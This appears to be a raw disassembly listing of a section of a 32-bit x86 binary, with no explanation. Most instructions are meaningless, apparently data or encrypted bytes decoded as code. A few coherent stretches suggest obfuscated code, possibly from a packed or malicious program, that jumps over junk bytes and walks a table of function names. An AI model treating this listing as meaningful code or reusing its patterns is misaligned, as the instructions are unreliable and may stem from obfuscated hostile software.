  40e5e4:	test   bh,0xef
  40e5e7:	inc    ebp
  40e5e8:	sbb    eax,0x4fd142c1
  40e5ed:	ins    DWORD PTR es:[edi],dx
  40e5ee:	ss jle 0x40e599
  40e5f1:	nop
  40e5f2:	and    dl,BYTE PTR [esp+edi*2-0x6edbfdb2]
  40e5f9:	or     DWORD PTR [eax+0xd],esi
  40e5fc:	iret   
  40e5fd:	adc    ch,BYTE PTR ds:0xfa3bc460
  40e603:	jbe    0x40e653
  40e605:	repz jns 0x40e67e
  40e608:	not    DWORD PTR [eax]
  40e60a:	inc    esi
  40e60b:	test   al,0x79
  40e60d:	outs   dx,BYTE PTR ds:[esi]
  40e60e:	mov    ebp,0xe4c3c9c
  40e613:	out    0xe1,al
  40e615:	pop    ds
  40e616:	jnp    0x40e619
  40e618:	iret   
  40e619:	sub    BYTE PTR [esi],ah
  40e61b:	push   es
  40e61c:	imul   edi,ebx,0x5e5c8c37
  40e622:	mov    al,0x55
  40e624:	pop    edi
  40e625:	clc    
  40e626:	jns    0x40e69c
  40e628:	inc    esp
  40e629:	pop    ss
  40e62a:	das    
  40e62b:	mov    eax,0x8e521b6d
  40e630:	out    dx,al
  40e631:	into   
  40e632:	stos   DWORD PTR es:[edi],eax
  40e633:	mov    al,ds:0x1c576616
  40e638:	cwde   
  40e639:	dec    edx
  40e63a:	or     eax,0xc363fece
  40e63f:	jp     0x40e60f
  40e641:	add    al,0xab
  40e643:	out    dx,al
  40e644:	add    al,bh
  40e646:	jno    0x40e650
  40e648:	loopne 0x40e6c9
  40e64a:	(bad)  
  40e64b:	dec    eax
  40e64c:	rol    BYTE PTR ds:0x13b9c5de,0x98
  40e654:	addr16 (bad) 
  40e656:	xor    DWORD PTR [esi],ebx
  40e658:	aas    
  40e659:	xor    al,0xb7
  40e65b:	or     edx,0x2e
  40e65e:	cmp    dl,BYTE PTR [esi+0x41]
  40e661:	add    ecx,DWORD PTR [ebp+0x3471c329]
  40e667:	dec    ebp
  40e668:	call   0x4b986c9a
  40e66d:	cmp    DWORD PTR [ebx-0x16],0xe711e3a9
  40e674:	outs   dx,DWORD PTR ds:[esi]
  40e675:	int    0x29
  40e677:	jge    0x40e6eb
  40e679:	cdq    
  40e67a:	mov    ah,0x99
  40e67c:	xchg   DWORD PTR [edx-0x75cdf0dc],edi
  40e682:	and    al,0x1f
  40e684:	xchg   esi,eax
  40e685:	xor    BYTE PTR [ebx-0x2c62b84c],0xe8
  40e68c:	jae    0x40e6a3
  40e68e:	adc    al,BYTE PTR [eax-0x5cd3108d]
  40e694:	popa   
  40e695:	mov    ds:0x5eeae280,eax
  40e69a:	aas    
  40e69b:	dec    ebx
  40e69c:	fnstcw WORD PTR [edx]
  40e69e:	ja     0x40e6b2
  40e6a0:	add    eax,0x60dbf50b
  40e6a5:	pop    esp
  40e6a6:	out    0x89,eax
  40e6a8:	jp     0x40e661
  40e6aa:	push   0x78c69956
  40e6af:	pop    ecx
  40e6b0:	push   edi
  40e6b1:	aam    0xa6
  40e6b3:	push   esp
  40e6b4:	(bad)  
  40e6b5:	fs call 0x9494:0xf79eafa4
  40e6bd:	bound  ebp,QWORD PTR [ebx]
  40e6bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e6c0:	and    dl,al
  40e6c2:	xchg   ebp,eax
  40e6c3:	add    eax,0x4ce0e349
  40e6c8:	(bad)  
  40e6ca:	dec    edi
  40e6cb:	mov    bl,0x10
  40e6cd:	addr16 inc eax
  40e6cf:	cli    
  40e6d0:	push   ecx
  40e6d1:	inc    eax
  40e6d2:	into   
  40e6d3:	cmp    DWORD PTR [eax+0x68],0x7d2c187d
  40e6da:	hlt    
  40e6db:	mov    ecx,edx
  40e6dd:	mov    dl,0xb9
  40e6df:	sbb    DWORD PTR [ebx],0x93c37dcf
  40e6e5:	out    dx,al
  40e6e6:	xor    DWORD PTR [edi+ecx*1+0x42],0x26db6834
  40e6ee:	sbb    al,0xe3
  40e6f0:	daa    
  40e6f1:	inc    esi
  40e6f2:	out    dx,al
  40e6f3:	dec    esi
  40e6f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e6f5:	and    esi,DWORD PTR [edx+0x4471e499]
  40e6fb:	mov    eax,ds:0x611d042e
  40e700:	dec    esp
  40e701:	dec    esp
  40e702:	jecxz  0x40e689
  40e704:	sar    bl,cl
  40e706:	mov    ebp,0xec840fab
  40e70b:	push   cs
  40e70c:	fprem1 
  40e70e:	sbb    DWORD PTR es:[esi+0x14ed29ef],eax
  40e715:	sub    eax,0x177692f
  40e71a:	cmp    ebx,DWORD PTR [ebp-0x1]
  40e71d:	nop
  40e71e:	adc    eax,0x42536093
  40e723:	adc    BYTE PTR [edi],0xeb
  40e726:	outs   dx,DWORD PTR ds:[esi]
  40e727:	xchg   esp,eax
  40e728:	sub    al,0x77
  40e72a:	add    DWORD PTR [edx+ecx*1+0xcef8b44],0xe210bdf5
  40e735:	mov    al,0xc
  40e737:	ds pop ebx
  40e739:	jae    0x40e76c
  40e73b:	jmp    0x40e78b
  40e73d:	push   edx
  40e73e:	xor    DWORD PTR [ebp+esi*4-0x3a],ecx
  40e742:	aaa    
  40e743:	inc    eax
  40e744:	js     0x40e796
  40e746:	les    eax,FWORD PTR [bp+si+0x14]
  40e74a:	jl     0x40e6d9
  40e74c:	or     DWORD PTR [edi],esp
  40e74e:	pop    ebp
  40e74f:	and    DWORD PTR [ecx],ecx
  40e751:	mov    dl,0xc9
  40e753:	or     ebp,edx
  40e755:	int3   
  40e756:	inc    eax
  40e757:	inc    ecx
  40e758:	push   esi
  40e759:	or     BYTE PTR [edx-0x4b3f38f7],dl
  40e75f:	and    eax,0xb969bab0
  40e764:	adc    dh,BYTE PTR [ecx]
  40e766:	adc    ecx,DWORD PTR [edx-0x68467b73]
  40e76c:	aad    0x79
  40e76e:	pusha  
  40e76f:	add    esi,DWORD PTR [edx+0x3e]
  40e772:	mov    ds:0x70937aa2,al
  40e777:	sbb    al,0x28
  40e779:	xchg   BYTE PTR [eax-0xb],bl
  40e77c:	daa    
  40e77d:	inc    edi
  40e77e:	aaa    
  40e77f:	ins    BYTE PTR es:[edi],dx
  40e780:	ror    DWORD PTR [ecx-0x8],0x6
  40e784:	ins    DWORD PTR es:[edi],dx
  40e785:	ja     0x40e713
  40e787:	add    al,0x98
  40e789:	push   cs
  40e78a:	xchg   ecx,eax
  40e78b:	ja     0x40e713
  40e78d:	ds stos DWORD PTR es:[edi],eax
  40e78f:	mov    ch,0xc4
  40e791:	outs   dx,DWORD PTR ss:[esi]
  40e793:	frstor [eax-0x3be4a847]
  40e799:	stos   DWORD PTR es:[edi],eax
  40e79a:	jb     0x40e773
  40e79c:	mov    ebx,0xc625791c
  40e7a1:	int    0xbe
  40e7a3:	and    BYTE PTR [ebx],bl
  40e7a5:	(bad)  
  40e7a6:	idiv   DWORD PTR [ebx+0x19]
  40e7a9:	inc    eax
  40e7aa:	int    0xdb
  40e7ac:	inc    eax
  40e7ad:	jb     0x40e79b
  40e7af:	not    DWORD PTR [eax+ecx*1-0x7051ef17]
  40e7b6:	cmp    DWORD PTR [edx],0xbd3d24c2
  40e7bc:	enter  0x43c,0xaa
  40e7c0:	ss es mov dh,0x7
  40e7c4:	pop    eax
  40e7c5:	dec    ebp
  40e7c6:	test   eax,0xe347de3a
  40e7cb:	and    edx,DWORD PTR [edi-0x3]
  40e7ce:	mov    edx,0x91750bf2
  40e7d3:	sbb    bl,BYTE PTR [ecx+0x62fc0203]
  40e7d9:	gs call 0x409afb9c
  40e7df:	aaa    
  40e7e0:	pop    esp
  40e7e1:	mov    ebp,0xbbdcac77
  40e7e6:	or     dh,BYTE PTR [eax+0x15]
  40e7e9:	nop
  40e7ea:	(bad)  
  40e7eb:	mov    eax,ds:0x727887c4
  40e7f0:	push   ebx
  40e7f1:	ins    DWORD PTR es:[edi],dx
  40e7f2:	jbe    0x40e827
  40e7f4:	sbb    BYTE PTR [esi+eax*8],bh
  40e7f7:	imul   ecx,DWORD PTR fs:[ebx-0xf],0xf32856f8
  40e7ff:	cmp    al,0x9c
  40e801:	(bad)  
  40e802:	and    eax,DWORD PTR [esi-0x11]
  40e805:	add    eax,0xb7a6d075
  40e80a:	in     al,0x32
  40e80c:	jg     0x40e855
  40e80e:	sar    BYTE PTR [eax+ebx*8+0x33a19b25],cl
  40e815:	xchg   ecx,eax
  40e816:	stos   DWORD PTR es:[edi],eax
  40e817:	mov    ch,0x4c
  40e819:	mov    DWORD PTR [ebx],edi
  40e81b:	mov    esi,0xedaf0cca
  40e820:	or     al,0x8
  40e822:	(bad)
  40e826:	clc    
  40e827:	pop    ebx
  40e828:	sbb    ch,bh
  40e82a:	dec    esi
  40e82b:	(bad)  
  40e82c:	adc    eax,0x583654b5
  40e831:	or     al,0x1a
  40e833:	jmp    0x40e80d
  40e835:	xor    esi,DWORD PTR [edx]
  40e837:	mov    ah,0xa5
  40e839:	in     eax,0x7f
  40e83b:	sub    ch,BYTE PTR [ecx-0x13]
  40e83e:	or     bh,BYTE PTR [ebx+0x54]
  40e841:	add    DWORD PTR [edi-0x50060692],ecx
  40e847:	ror    DWORD PTR [ecx+0x202d44c5],cl
  40e84d:	pop    edi
  40e84e:	inc    esp
  40e84f:	jmp    0x9a432050
  40e854:	fcomp  DWORD PTR [esi+0x36]
  40e857:	mov    bl,0x23
  40e859:	daa    
  40e85a:	dec    ecx
  40e85b:	cs test eax,0x1b797bb0
  40e861:	int    0xc9
  40e863:	adc    DWORD PTR [eax],eax
  40e865:	mov    dl,dl
  40e867:	mov    ds:0x752a0d2a,eax
  40e86c:	test   edi,edx
  40e86e:	or     al,0x50
  40e870:	xor    ecx,DWORD PTR [esi+0x88a94c5]
  40e876:	jmp    0xf87d867
  40e87b:	sub    bh,cl
  40e87d:	and    al,0xc9
  40e87f:	or     eax,0xbd57008d
  40e884:	xchg   esp,eax
  40e885:	das    
  40e886:	aam    0x95
  40e888:	repz mov ecx,es
  40e88b:	dec    ecx
  40e88c:	jmp    0x40e826
  40e88e:	addr16 jge 0x40e8d0
  40e891:	mov    ebx,0xf83ae3d1
  40e896:	ror    BYTE PTR [esi-0x2873595b],0x8b
  40e89d:	dec    ebp
  40e89e:	loopne 0x40e82b
  40e8a0:	xor    eax,0x434355
  40e8a5:	mov    esi,DWORD PTR [esi]
  40e8a7:	xor    DWORD PTR ds:0x43429e,esi
  40e8ad:	mov    esi,0x7510855
  40e8b2:	xor    DWORD PTR ds:0x4342a2,0x4325ec
  40e8bc:	xor    eax,esi
  40e8be:	add    eax,ebx
  40e8c0:	mov    DWORD PTR ds:0x432cc2,0x3895
  40e8ca:	cmp    ecx,eax
  40e8cc:	mov    DWORD PTR ds:0x434311,0xed9
  40e8d6:	je     0x40fd3a
  40e8dc:	push   DWORD PTR [ebp-0x20]
  40e8df:	adc    DWORD PTR ds:0x432cc2,0x4325f8
  40e8e9:	push   DWORD PTR [ebp+0x8]
  40e8ec:	call   0x404cd4
  40e8f1:	jmp    0x40ece5
  40e8f6:	ret    
  40e8f7:	rcr    BYTE PTR [ebp-0x67],1
  40e8fa:	popa   
  40e8fb:	cdq    
  40e8fc:	ret    
  40e8fd:	xor    WORD PTR [eax],0xffa7
  40e901:	(bad)  
  40e903:	arpl   WORD PTR [esi+0x709a2b62],si
  40e909:	jo     0x40e954
  40e90b:	jge    0x40e97d
  40e90d:	jo     0x40e8cc
  40e90f:	cwde   
  40e910:	hlt    
  40e911:	or     DWORD PTR [ebx+0x10],ebp
  40e914:	lea    edi,[esi]
  40e916:	call   0x2fbb82cd
  40e91b:	sbb    eax,0xecb60b4f
  40e920:	cmp    BYTE PTR [eax],dl
  40e922:	shl    BYTE PTR [ebp-0x5a700fd2],1
  40e928:	pop    edx
  40e929:	adc    bl,BYTE PTR [edx+0x66d03f6]
  40e92f:	test   al,0x18
  40e931:	in     eax,0xd1
  40e933:	pavgb  mm1,QWORD PTR [esi-0x69]
  40e937:	ret    0x5a77
  40e93a:	lock adc esp,DWORD PTR [edx]
  40e93d:	or     BYTE PTR [ebx],bh
  40e93f:	retf   0xf23e
  40e942:	mov    dl,0x84
  40e944:	and    dh,BYTE PTR [ebx+0x4ac949b4]
  40e94a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e94b:	and    al,BYTE PTR [ecx]
  40e94d:	jmp    0xdbe9d2a4
  40e952:	mov    DWORD PTR [ecx-0x7cd1a757],edi
  40e958:	sbb    edi,DWORD PTR [edi-0x5186695d]
  40e95e:	pop    ebp
  40e95f:	in     al,0x41
  40e961:	arpl   WORD PTR [esi-0xe],cx
  40e964:	(bad)  
  40e965:	fsubr  st,st(6)
  40e967:	add    DWORD PTR ds:0xe7fb71d8,ebp
  40e96d:	loope  0x40e979
  40e96f:	adc    bh,ah
  40e971:	stos   BYTE PTR es:[edi],al
  40e972:	add    DWORD PTR [ebx+0x6b227aec],edi
  40e978:	ins    BYTE PTR es:[edi],dx
  40e979:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e97a:	ror    esp,1
  40e97c:	jae    0x40e99c
  40e97e:	adc    eax,0x26b82de
  40e983:	mov    bl,0x10
  40e985:	imul   eax,DWORD PTR [edi],0x18
  40e988:	sbb    DWORD PTR ds:0xc1646268,ebp
  40e98e:	push   ss
  40e98f:	or     edi,DWORD PTR [eax+edi*2]
  40e992:	push   edi
  40e993:	mov    ds:0x9f069283,al
  40e998:	inc    esi
  40e999:	rol    DWORD PTR [ecx],0xa5
  40e99c:	xor    BYTE PTR [ecx+esi*8-0x33],0x9c
  40e9a1:	push   ss
  40e9a2:	pop    ds
  40e9a3:	cmc    
  40e9a4:	jb     0x40e9b1
  40e9a6:	sbb    al,0xd6
  40e9a8:	out    0x98,eax
  40e9aa:	fcomp  DWORD PTR [edi-0x276eeef2]
  40e9b0:	stos   DWORD PTR es:[edi],eax
  40e9b1:	or     edi,DWORD PTR [ecx]
  40e9b3:	sbb    al,0xed
  40e9b5:	dec    ebp
  40e9b6:	mov    es,ebp
  40e9b8:	call   0xaa3ccb4e
  40e9bd:	sbb    esp,eax
  40e9bf:	cdq    
  40e9c0:	sbb    DWORD PTR [esi],ebx
  40e9c2:	and    eax,0x5ca8ff85
  40e9c7:	jl     0x40e982
  40e9c9:	imul   DWORD PTR [edx+0x39badad1]
  40e9cf:	mov    ah,0xfb
  40e9d1:	add    eax,0x42c7635b
  40e9d6:	add    al,ch
  40e9d8:	repz dec ecx
  40e9da:	jg     0x40ea4b
  40e9dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e9dd:	loop   0x40e96d
  40e9df:	jge    0x40e986
  40e9e1:	adc    BYTE PTR [ebx+ebx*4],dh
  40e9e4:	inc    ebp
  40e9e5:	and    eax,0x5569b7af
  40e9ea:	scas   al,BYTE PTR es:[edi]
  40e9eb:	xor    DWORD PTR [edi-0x1e],ebp
  40e9ee:	xchg   edi,eax
  40e9ef:	loop   0x40e97e
  40e9f1:	mov    ecx,0x8608f568
  40e9f6:	dec    ecx
  40e9f7:	jmp    0x9ec821a6
  40e9fc:	cdq    
  40e9fd:	inc    eax
  40e9fe:	sbb    bh,BYTE PTR [esi-0x19]
  40ea01:	sub    al,0x69
  40ea03:	scas   al,BYTE PTR es:[edi]
  40ea04:	(bad)  
  40ea05:	call   0xa8adaf6d
  40ea0a:	xor    BYTE PTR [ecx+0x17],ch
  40ea0d:	sbb    eax,0xf07f88fe
  40ea12:	ror    dh,1
  40ea14:	in     eax,0xe4
  40ea16:	xor    edx,esi
  40ea18:	retf   0x9c21
  40ea1b:	mov    eax,ds:0xb9ffaf1b
  40ea20:	xor    ebx,ecx
  40ea22:	mov    ah,0x36
  40ea24:	arpl   WORD PTR [ebp+0x49],bp
  40ea27:	and    BYTE PTR [ebx-0x74],dh
  40ea2a:	or     BYTE PTR [eax-0x16],0x87
  40ea2e:	or     esi,DWORD PTR es:0x4b0855fc
  40ea35:	hlt    
  40ea36:	pop    edi
  40ea37:	clc    
  40ea38:	xor    DWORD PTR [eax+0x7f],ebp
  40ea3b:	fwait
  40ea3c:	mov    al,ds:0x86efa1c3
  40ea41:	dec    esp
  40ea42:	mov    ch,0x1b
  40ea44:	outs   dx,BYTE PTR ds:[esi]
  40ea45:	popa   
  40ea46:	mov    eax,0x78d86409
  40ea4b:	loop   0x40e9cd
  40ea4d:	inc    esp
  40ea4e:	pop    ebp
  40ea4f:	pop    ds
  40ea50:	fcom   DWORD PTR [ebp+0xd]
  40ea53:	cmp    ah,bl
  40ea55:	mov    eax,0x888f69ef
  40ea5a:	adc    al,0xda
  40ea5c:	xor    al,0x6e
  40ea5e:	adc    al,0x11
  40ea60:	retf   0xac6b
  40ea63:	repz enter 0x194e,0x3b
  40ea68:	mov    edx,0x6c50a330
  40ea6d:	(bad)  
  40ea6e:	mov    al,0x18
  40ea70:	ds out 0x94,eax
  40ea73:	loop   0x40eaab
  40ea75:	inc    ecx
  40ea76:	jecxz  0x40eaa4
  40ea78:	pop    edi
  40ea79:	fwait
  40ea7a:	and    bh,BYTE PTR [eax+0x5f]
  40ea7d:	jp     0x40ea73
  40ea7f:	adc    BYTE PTR [edi+0x7438fc56],bl
  40ea85:	mov    esp,0x3833d8fa
  40ea8a:	ret    
  40ea8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea8c:	call   0x39097160
  40ea91:	imul   ecx,DWORD PTR [ebp+0x1cf9adec],0x96cfef39
  40ea9b:	push   esi
  40ea9c:	dec    ebx
  40ea9d:	cwde   
  40ea9e:	cmp    BYTE PTR [edi+0xa057a9c],0x43
  40eaa5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eaa6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eaa7:	out    dx,eax
  40eaa8:	inc    ebp
  40eaa9:	mov    ah,0xa6
  40eaab:	dec    edx
  40eaac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eaad:	imul   esi,DWORD PTR [eax+0x1c],0x47f3c466
  40eab4:	dec    esp
  40eab5:	pop    esi
  40eab6:	jmp    0x46eb53f8
  40eabb:	or     eax,0x9404f7e3
  40eac0:	shl    BYTE PTR [ebx-0x1f080a62],cl
  40eac6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eac7:	inc    esp
  40eac8:	repz cli 
  40eaca:	aad    0x1a
  40eacc:	pop    ss
  40eacd:	dec    ebx
  40eace:	rcr    DWORD PTR [edx+ebp*8],0xeb
  40ead2:	in     eax,dx
  40ead3:	xchg   ecx,eax
  40ead4:	cmp    BYTE PTR [esi+0x734e2fb3],dl
  40eada:	fstp   st(4)
  40eadc:	test   al,0xe8
  40eade:	mov    ah,0xe3
  40eae0:	retf   
  40eae1:	jmp    0x34d5:0xf83dea68
  40eae8:	not    DWORD PTR [edi-0x73]
  40eaeb:	(bad)  
  40eaec:	aas    
  40eaed:	lods   al,BYTE PTR ds:[esi]
  40eaee:	shl    DWORD PTR [edx],0xc2
  40eaf1:	and    bh,BYTE PTR [edi+edi*2+0x77d8a9b9]
  40eaf8:	mov    ch,BYTE PTR [edi+0x7f]
  40eafb:	sbb    eax,0xcf088bd1
  40eb00:	dec    eax
  40eb01:	rol    dh,cl
  40eb03:	outs   dx,DWORD PTR ds:[esi]
  40eb04:	popa   
  40eb05:	stos   BYTE PTR es:[edi],al
  40eb06:	cmc    
  40eb07:	imul   eax,DWORD PTR [edx-0x4926c059],0xda014613
  40eb11:	lods   al,BYTE PTR ds:[esi]
  40eb12:	mov    ds:0x84fc3606,eax
  40eb17:	rcr    BYTE PTR [ebx+edi*1-0xdc0b387],1
  40eb1e:	aas    
  40eb1f:	pop    esi
  40eb20:	cmp    esi,0x7b453108
  40eb26:	push   0x7
  40eb28:	in     al,0x3c
  40eb2a:	fnstcw WORD PTR [esi-0x6a5a6166]
  40eb30:	pushw  cs
  40eb32:	das    
  40eb33:	iret   
  40eb34:	xor    eax,0xfdc32a78
  40eb39:	inc    esi
  40eb3a:	push   esi
  40eb3b:	jge    0x40ebb9
  40eb3d:	frstor [esi]
  40eb3f:	mov    dl,BYTE PTR [ecx-0x5e95a2ce]
  40eb45:	sbb    ebp,DWORD PTR [esi-0x301895a3]
  40eb4b:	call   FWORD PTR [ecx-0x5b]
  40eb4e:	or     eax,0xd73dd561
  40eb53:	enter  0xcc92,0xc1
  40eb57:	ret    
  40eb58:	je     0x40eb7b
  40eb5a:	scas   eax,DWORD PTR es:[edi]
  40eb5b:	lds    ecx,FWORD PTR [edx]
  40eb5d:	inc    esp
  40eb5e:	push   0xffffffad
  40eb60:	xchg   ecx,eax
  40eb61:	sub    eax,0x82a0ada1
  40eb66:	fidiv  WORD PTR [edi]
  40eb68:	jbe    0x40eb36
  40eb6a:	rol    BYTE PTR [eax-0x680d2c1d],1
  40eb70:	mov    BYTE PTR ds:0x48ce59e3,cl
  40eb76:	dec    ebx
  40eb77:	add    al,0x7a
  40eb79:	jmp    0x40eb64
  40eb7b:	enter  0xcf1f,0xf3
  40eb7f:	pop    es
  40eb80:	mov    ch,al
  40eb82:	popa   
  40eb83:	push   cs
  40eb84:	jnp    0x40eb77
  40eb86:	rsm    
  40eb88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eb89:	push   0x2d477028
  40eb8e:	sbb    al,0x77
  40eb90:	mov    ebp,0xf2f414d1
  40eb95:	pushf  
  40eb96:	xlat   BYTE PTR ds:[ebx]
  40eb97:	call   0x426881cc
  40eb9c:	mov    eax,ds:0x4e3ae8ef
  40eba1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eba2:	scas   eax,DWORD PTR es:[edi]
  40eba3:	(bad)  
  40eba4:	xchg   edi,eax
  40eba5:	push   0xe7f1ed97
  40ebaa:	xor    eax,0xa0678890
  40ebaf:	mov    ebp,0x7a1e1b27
  40ebb4:	fcom   DWORD PTR [edx]
  40ebb6:	jmp    DWORD PTR [ebp+0x9468de6]
  40ebbc:	fs call 0x9341880a
  40ebc2:	mov    edx,0xcc090ab1
  40ebc7:	mov    esi,0x9e6bf41b
  40ebcc:	pop    edi
  40ebcd:	ret    0x7352
  40ebd0:	mov    eax,ds:0xca13bc62
  40ebd5:	sub    dl,bl
  40ebd7:	lods   al,BYTE PTR ds:[esi]
  40ebd8:	pop    edx
  40ebd9:	daa    
  40ebda:	jbe    0x40ebc3
  40ebdc:	xor    ebx,edx
  40ebde:	in     eax,0x2a
  40ebe0:	inc    esp
  40ebe1:	mov    ebp,0xe1351a15
  40ebe6:	lahf   
  40ebe7:	jg     0x40eb99
  40ebe9:	adc    eax,0x38fa724a
  40ebee:	adc    edx,DWORD PTR [eax+0x35]
  40ebf1:	es inc esp
  40ebf3:	fmul   DWORD PTR [eax]
  40ebf5:	ins    DWORD PTR es:[edi],dx
  40ebf6:	test   eax,0xbd0cfe8f
  40ebfb:	xchg   esp,edi
  40ebfd:	xchg   esp,eax
  40ebfe:	out    0xe3,al
  40ec00:	lods   al,BYTE PTR ds:[esi]
  40ec01:	jmp    0x9f72:0x4af9a7a7
  40ec08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec09:	xor    dl,al
  40ec0b:	loopne 0x40ec64
  40ec0d:	mov    BYTE PTR [ebx+eiz*4-0x554a337f],ch
  40ec14:	inc    ecx
  40ec15:	(bad)  
  40ec17:	mov    ecx,fs
  40ec19:	cdq    
  40ec1a:	xor    esi,eax
  40ec1c:	sahf   
  40ec1d:	jle    0x40eba2
  40ec1f:	sub    ebx,ecx
  40ec21:	(bad)  
  40ec22:	fiadd  DWORD PTR [esi-0x449206d]
  40ec28:	test   eax,0x2d7eb7a0
  40ec2d:	xor    BYTE PTR [eax+edx*2],ah
  40ec30:	jbe    0x40ebec
  40ec32:	loope  0x40ec7e
  40ec34:	xor    edi,edx
  40ec36:	aam    0x61
  40ec38:	xchg   DWORD PTR [edx+ecx*1+0x4b],esp
  40ec3c:	test   al,0x1c
  40ec3e:	push   0x0
  40ec40:	adc    esp,DWORD PTR [edx]
  40ec42:	push   esi
  40ec43:	cld    
  40ec44:	xor    DWORD PTR [eax],edx
  40ec46:	js     0x40ec6d
  40ec48:	pop    edx
  40ec49:	mov    DWORD PTR [eax],edi
  40ec4b:	mov    ch,0x4f
  40ec4d:	shr    BYTE PTR [edx],cl
  40ec4f:	cmp    dh,bh
  40ec51:	bound  edi,QWORD PTR [edi-0x6a0b8d6f]
  40ec57:	fwait
  40ec58:	out    0xe4,al
  40ec5a:	xor    eax,0x21294622
  40ec5f:	xor    al,BYTE PTR fs:[eax+0x23]
  40ec63:	sbb    DWORD PTR [ebp+esi*1-0x77],esi
  40ec67:	loop   0x40ec51
  40ec69:	push   ebp
  40ec6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec6b:	pushf  
  40ec6c:	xchg   esp,eax
  40ec6d:	(bad)  
  40ec6f:	sbb    BYTE PTR [edi+0x78],0x8b
  40ec73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec74:	dec    esp
  40ec75:	mov    edx,edi
  40ec77:	repz enter 0x91dd,0xc0
  40ec7c:	push   ebx
  40ec7d:	jge    0x40ecb5
  40ec7f:	xor    dl,cl
  40ec81:	xchg   ebp,eax
  40ec82:	mov    ?,WORD PTR [esi-0x483c5dd1]
  40ec88:	mov    al,ds:0x7a449df5
  40ec8d:	data16 sahf 
  40ec8f:	outs   dx,DWORD PTR ds:[esi]
  40ec90:	out    0x77,eax
  40ec92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec93:	(bad)  
  40ec94:	mov    ebx,0x88c2c38c
  40ec99:	mov    edi,0x8ac1913c
  40ec9e:	push   ebx
  40ec9f:	outs   dx,BYTE PTR ds:[esi]
  40eca0:	in     eax,dx
  40eca1:	fwait
  40eca2:	dec    eax
  40eca3:	das    
  40eca4:	sub    BYTE PTR [edi],al
  40eca6:	pushf  
  40eca7:	(bad)  
  40eca8:	push   ebp
  40eca9:	stos   BYTE PTR es:[edi],al
  40ecaa:	inc    esp
  40ecab:	jg     0x40ed03
  40ecad:	add    BYTE PTR [eax-0x5a],bl
  40ecb0:	push   ds
  40ecb1:	inc    esi
  40ecb2:	call   FWORD PTR [edi-0x2eb80f5d]
  40ecb8:	dec    ebp
  40ecb9:	add    DWORD PTR [eax*8-0x19b00574],ebp
  40ecc0:	push   edi
  40ecc1:	dec    edi
  40ecc2:	cmp    bl,bh
  40ecc4:	fwait
  40ecc5:	jmp    0xbbb3337b
  40ecca:	or     esi,DWORD PTR [eax]
  40eccc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eccd:	pop    es
  40ecce:	jp     0x40ec8b
  40ecd0:	scas   al,BYTE PTR es:[edi]
  40ecd1:	fwait
  40ecd2:	aad    0x21
  40ecd4:	sbb    BYTE PTR [ecx+0x5c8c1103],ah
  40ecda:	dec    ecx
  40ecdb:	(bad)  
  40ecdc:	arpl   WORD PTR [ecx-0x77340464],di
  40ece2:	call   0x45ca7a42
  40ece7:	in     al,dx
  40ece8:	mov    eax,DWORD PTR [ebp-0x4]
  40eceb:	mov    ecx,DWORD PTR [ebp-0x14]
  40ecee:	xor    eax,esi
  40ecf0:	add    eax,ebx
  40ecf2:	cmp    ecx,eax
  40ecf4:	je     0x40fd3a
  40ecfa:	mov    eax,DWORD PTR [ebp-0x14]
  40ecfd:	mov    eax,DWORD PTR [eax+0x18]
  40ed00:	mov    DWORD PTR [ebp-0x20],eax
  40ed03:	mov    eax,DWORD PTR [ebp-0x14]
  40ed06:	mov    ecx,DWORD PTR [ebp+0x8]
  40ed09:	add    ecx,DWORD PTR [eax+0x20]
  40ed0c:	mov    DWORD PTR [ebp-0x28],ecx
  40ed0f:	mov    eax,DWORD PTR [ebp-0x14]
  40ed12:	mov    ecx,DWORD PTR [ebp+0x8]
  40ed15:	jmp    0x40f109
  40ed1a:	loopne 0x40ece4
  40ed1c:	or     ebx,DWORD PTR [edx]
  40ed1e:	xor    esp,ecx
  40ed20:	in     eax,dx
  40ed21:	ror    BYTE PTR [esi],cl
  40ed23:	cmp    DWORD PTR [ebx-0x5a202789],eax
  40ed29:	rol    DWORD PTR [esi+eiz*4],cl
  40ed2c:	jo     0x40ed9e
  40ed2e:	dec    ecx
  40ed2f:	jge    0x40eda1
  40ed31:	jo     0x40ed9d
  40ed33:	inc    ebx
  40ed34:	cmp    esp,edi
  40ed36:	push   edx
  40ed37:	sub    al,0x77
  40ed39:	sub    al,cl
  40ed3b:	sub    al,0xf7
  40ed3d:	fdivr  DWORD PTR [eax]
  40ed3f:	ss mov cl,0xcd
  40ed42:	xchg   ebx,eax
  40ed43:	push   ecx
  40ed44:	arpl   WORD PTR [ecx],ax
  40ed46:	les    ebp,FWORD PTR es:[edx+esi*4+0x7c]
  40ed4b:	adc    ebp,0x1a6703d3
  40ed51:	shl    dl,0x61
  40ed54:	or     DWORD PTR [ebx+0x32b7602d],ebp
  40ed5a:	(bad)  
  40ed5b:	cld    
  40ed5c:	or     eax,0xa3e27759
  40ed61:	cmp    al,0x47
  40ed63:	and    DWORD PTR [edx],edx
  40ed65:	mov    ch,0x7b
  40ed67:	out    0x23,al
  40ed69:	sub    DWORD PTR [edx-0x43],edx
  40ed6c:	or     ecx,DWORD PTR [esp+ecx*8-0x51]
  40ed70:	or     ebp,DWORD PTR [eax]
  40ed72:	lods   al,BYTE PTR ds:[esi]
  40ed73:	cmp    DWORD PTR ds:0xdca43930,esp
  40ed79:	xchg   edx,eax
  40ed7a:	int    0xa3
  40ed7c:	les    edi,FWORD PTR [ebx-0x148135e7]
  40ed82:	lods   eax,DWORD PTR ds:[esi]
